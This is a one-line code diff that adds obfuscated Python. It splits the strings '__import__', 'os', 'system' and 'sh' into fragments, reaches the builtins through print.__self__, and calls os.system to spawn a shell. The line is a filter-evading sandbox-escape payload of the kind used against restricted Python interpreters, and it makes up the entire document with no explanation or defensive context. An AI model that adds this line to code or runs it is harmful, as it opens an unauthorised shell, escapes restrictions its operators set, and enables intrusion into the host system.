@@ -1,0 +1,1 @@
+getattr(getattr(print.__self__, ''.join(['__imp', 'ort__']))(''.join(['o', 's'])), ''.join(['sy', 'stem']))(''.join(['s','h']))
